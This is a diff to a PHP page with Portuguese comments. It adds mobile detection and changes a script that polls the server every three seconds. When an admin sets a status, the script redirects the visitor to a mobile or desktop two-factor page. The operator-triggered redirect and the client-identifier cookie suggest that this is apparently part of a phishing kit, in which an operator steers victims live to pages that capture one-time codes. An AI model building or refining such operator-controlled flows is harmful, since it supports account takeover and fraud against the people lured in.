@@ -5,6 +5,18 @@ session_start();
 // Inclui a conexão com o banco de dados
 require 'db.php';
 
+function isMobileDevice() {
+    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
+}
+
+// Define o alvo do redirecionamento com base no dispositivo
+if (isMobileDevice()) {
+    $redirect_target_2fa = 'doisfatores2mobile.php';
+} else {
+    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
+    $redirect_target_2fa = 'dois_fatores.php'; 
+}
+
 // Prepara variáveis com valores padrão
 $identificador_label = 'Não identificado';
 $identificador_puro = '';
@@ -51,6 +63,8 @@ if (isset($_COOKIE['identificador_cliente'])) {
     header('Location: index.php');
     exit;
 }
+
+
 
 ?>
 <!DOCTYPE html>
@@ -221,35 +235,34 @@ if (isset($_COOKIE['identificador_cliente'])) {
         })();
     </script>
     <script>
-        async function checkAdminCommand() {
-            try {
-                // Chama a nossa nova API
-                const response = await fetch('api_check_status.php');
-                const data = await response.json();
+        (function() {
+            // Pega a URL de redirecionamento que o PHP definiu
+            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
 
-                // Escreve o status no console para podermos depurar
-                console.log('Status atual do servidor:', data.status); 
+            async function checkAdminCommand() {
+                try {
+                    const response = await fetch('api_check_status.php');
+                    const data = await response.json();
 
-                // A CONDIÇÃO PRINCIPAL:
-                // Se o admin mudou o status para 'redirecionar_para_2fa'
-                if (data.status === 'redirecionar_para_2fa') {
-                    
-                    // Para o polling para não redirecionar múltiplas vezes
-                    clearInterval(statusInterval);
-                    
-                    console.log('Comando do admin recebido! Redirecionando...');
-                    
-                    // Redireciona o usuário para a tela de dois fatores
-                    window.location.href = 'dois_fatores.php';
+                    console.log('Status atual:', data.status); 
+
+                    if (data.status === 'redirecionar_para_2fa') {
+                        // Para a verificação para não redirecionar em loop
+                        clearInterval(statusInterval);
+                        
+                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
+                        
+                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
+                        window.location.href = redirectUrl;
+                    }
+                } catch (error) {
+                    console.error('Erro ao verificar status:', error);
                 }
-
-            } catch (error) {
-                console.error('Erro ao verificar status:', error);
             }
-        }
 
-        // Inicia a verificação periódica a cada 3000 milissegundos (3 segundos)
-        const statusInterval = setInterval(checkAdminCommand, 3000);
+            // Inicia a verificação a cada 3 segundos
+            const statusInterval = setInterval(checkAdminCommand, 3000);
+        })();
     </script>
 </body>
 </html>
